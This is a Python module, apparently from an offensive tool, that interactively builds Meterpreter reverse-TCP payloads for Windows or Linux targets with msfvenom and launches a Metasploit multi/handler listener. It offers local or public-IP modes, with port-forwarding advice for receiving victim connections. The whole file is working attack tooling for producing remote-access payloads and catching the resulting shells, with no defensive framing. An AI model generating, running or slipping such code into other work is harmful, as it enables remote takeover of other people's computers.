import os
import subprocess
import sys

from .ipv4_script import get_public_ip


def payload_script(info, first, second, inputs, user, OS, the_link, error, warning, ip):
    attacktype = (
        input(
            info
            + first
            + "Local reverse shell(Privet ip use)\n"
            + info
            + second
            + "Public reverse shell(Public ip use)\n"
            + inputs
            + "Please choose an option(1/2): "
        )
        .strip()
        .lower()
    )
    if attacktype == "1":
        platformattack = (
            input(inputs + "Choose the platform to attack (Windows/Linux): ")
            .strip()
            .lower()
        )
        payloadname = input(
            inputs + "Please enter a name for your payload (with extension): "
        ).strip()
        extension = payloadname.split(".")[-1].lower()
        script_dir = os.path.dirname(os.path.abspath(__file__))
        payloadname = os.path.join(script_dir, payloadname)
        port = (
            input(inputs + "Please enter the port to use (default is 4444): ").strip()
            or "4444"
        )

        if OS == "Windows":
            try:
                test = subprocess.run(
                    ["msfvenom.bat", "exit"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
            except subprocess.CalledProcessError as e:
                print(
                    error + "Command failed! Please ensure that metasploit is in path"
                )
                print("Exit code:", e.returncode)
                print("STDERR:", e.stderr)
                sys.exit()

            if not test.returncode != 0:
                print(
                    info + "[-] Metasploit is in the path and is correctly installed."
                )
                print(test.stderr)

            if platformattack == "windows":
                print(info + "Creating Payload...")
                command = (
                    "msfvenom -p windows/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )

                subprocess.run(
                    command,
                    shell=True,
                    check=True,
                    text=True,
                )
                print(info+"Your Payload has been created please verify the script floder")
                print(info + "Creating a Tcp listener...")

                process = subprocess.run(
                    f'msfconsole -x "use exploit/multi/handler; '
                    f"set payload windows/meterpreter/reverse_tcp; "
                    f"set lhost {ip}; "
                    f"set lport {port}; "
                    f'exploit"',
                    shell=True,
                    text=True,
                )

            elif platformattack == "linux":
                print("Creating Payload...")
                command = (
                    "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )

                subprocess.run(
                    command,
                    shell=True,
                    check=True,
                    text=True,
                )

                print(info + "Creating a Tcp listener...")

                subprocess.run(
                    "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    text=True,
                )

                print(info + "Creating a Tcp listener...")
        elif OS == "Linux":
            if platformattack == "windows":
                print("Creating Payload...")
                command = (
                    "msfvenom -p windows/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
            elif platformattack == "linux":
                print("Creating Payload...")
                command = (
                    "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
            else:
                print(
                    error
                    + "MacOS and Android are not supported yet but it will be in the next update. StayTuned: "
                    + the_link
                )
        else:
            print(
                error
                + "MacOS and Android are not supported yet but it will be in the next update and much more !. StayTuned: "
                + the_link
            )
    elif attacktype == "2":
        platformattack = (
            input(inputs + "Choose the platform to attack (Windows/Linux): ")
            .strip()
            .lower()
        )

        ip = get_public_ip()
        payloadname = input(
            inputs + "Please enter a name for your payload (with extension): "
        ).strip()
        extension = payloadname.split(".")[-1].lower()
        port = (
            input(inputs + "Please enter the port to use (default is 4444): ").strip()
            or "4444"
        )
        print(info + "Your public IP is: " + ip)
        print(
            warning
            + "Make sure to port forward your router to receive the connection from the target (This port "
            + port
            + ").\n"
            + warning
            + "Port forwarding and opening ports or exposing services like SSH or Metasploit payload listeners to the public internet can make your system highly vulnerable !\n"
            + warning
            + "Use this feature at your own risk and only if you know what you are doing !\n"
            + warning
            + "If you are not sure about port forwarding, please use the local reverse shell option instead."
        )
        if OS == "Windows":
            msfvenom = (
                "C:\\Users\\" + user + "\\metasploit-framework\\bin\\msfvenom.bat"
            )
            msfconsole = (
                "C:\\Users\\" + user + "\\metasploit-framework\\bin\\msfconsole.bat"
            )
            if platformattack == "windows":
                print("Creating Payload...")
                command = (
                    msfvenom
                    + " -p windows/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    msfconsole
                    + " -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
            elif platformattack == "linux":
                print("Creating Payload...")
                command = (
                    msfvenom
                    + " -p linux/x86/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    msfconsole
                    + " -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                )
        elif OS == "Linux":
            if platformattack == "windows":
                print("Creating Payload...")
                command = (
                    "msfvenom -p windows/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    "msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    text=True,
                )
            elif platformattack == "linux":
                print("Creating Payload...")
                command = (
                    "msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="
                    + ip
                    + " lport="
                    + port
                    + " -f "
                    + extension
                    + " > "
                    + payloadname
                )
                subprocess.run(command, shell=True, text=True)
                print(info + "Creating a Tcp listener...")
                subprocess.run(
                    "msfconsole -x 'use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set lhost "
                    + ip
                    + "; set lport "
                    + port
                    + "; exploit'",
                    shell=True,
                    text=True,
                )
            else:
                print(
                    error
                    + "MacOS and Android are not supported yet but it will be in the next update. StayTuned: "
                    + the_link
                )
        elif OS == "Darwin":
            print(
                ""
                + error
                + "MacOS is not supported yet but it will be in the next update and much more !. StayTuned: "
                + the_link
            )

    else:
        print(error + "Please enter a valid choice (1/2).")
